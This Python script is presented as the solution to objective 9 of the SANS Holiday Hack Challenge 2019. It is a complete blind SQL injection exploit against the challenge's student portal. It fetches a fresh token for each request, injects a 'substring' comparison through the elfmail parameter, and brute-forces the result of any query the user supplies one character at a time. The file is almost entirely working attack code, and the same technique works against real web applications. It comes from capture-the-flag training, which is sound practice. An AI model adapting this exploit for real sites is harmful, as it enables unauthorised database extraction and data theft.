import argparse
import sys
import textwrap
import urllib.parse
import requests

url = "https://studentportal.elfu.org"
alphabet_characters = '/abcdefghijklmnopqrstuvwxyz,.1234567890'
valid_text = 'Your application is still pending!'

alphabet = [char for char in alphabet_characters]
alphabet.insert(0, '')  # If this character is found, we know we hit the end of the string


# Execute the query.
# This method will handle the retrieval of the token
# Returns True if the query yielded True; False otherwise
def execute_query(session, input_data):
    token = session.get(f"{url}/validator.php").text
    encoded = urllib.parse.quote(input_data)
    result = session.get(f"{url}/application-check.php?elfmail={encoded}&token={token}")
    if valid_text in result.text:
        return True

    # Find the possible Error line
    error = [line.replace("<br>", "\n") for line in result.text.split('\n') if "Error:" in line]

    if error:
        print(f'SQL {error[0]}')
        exit()

    return False


def print_progress(prefix, result, current_attempt):
    print('\r%s%s%s' % (prefix, result, current_attempt), end='\r')


def run(sql, valid_elf_email):
    print(f"Email address: '{valid_elf_email}'")
    print(f"SQL query: {sql}\n")
    # Create a session for the cookie
    session = requests.Session()

    query_result = ''
    done = False
    while not done:
        position = len(query_result) + 1
        found = False

        # Try each letter in the given alphabet
        for c in alphabet:
            print_progress('Determining result: ', query_result, c)
            user_input = f"{valid_elf_email}' AND substring(({sql}),{position},1)='{c}' #"

            # Execute the query
            success = execute_query(session, user_input)

            if success:
                if c == '':
                    # End of the query result.
                    done = True

                # The query returned True: the letter on the position was correct
                query_result += c
                found = True
                break
        if not found:
            print(f'ERROR: The character on position {position} of the query result '
                  f'did not match any character in the given alphabet')
            break

    print(f'\n\ndone')
    print(f'Query result: {query_result}')


if __name__ == '__main__':
    print("SANS Holiday Hack Challenge 2019 - Objective 9 solution")
    print("-------------------------------------------------------")
    parser = argparse.ArgumentParser(
        epilog=textwrap.dedent('''\
            Example: elfu.py -e elf@elf.com "database()"
                     elfu.py -e elf@elf.com "select * from table"'''),
        formatter_class=argparse.RawTextHelpFormatter)

    parser.add_argument("sql", help="The SQL query to execute")
    parser.add_argument("-e", "--email",
                        help="The email address for which an application "
                             "was submitted",
                        required=True)
    args = parser.parse_args()

    display_help = False
    if args.sql and args.email:
        run(args.sql, args.email)
    else:
        parser.print_help(sys.stderr)
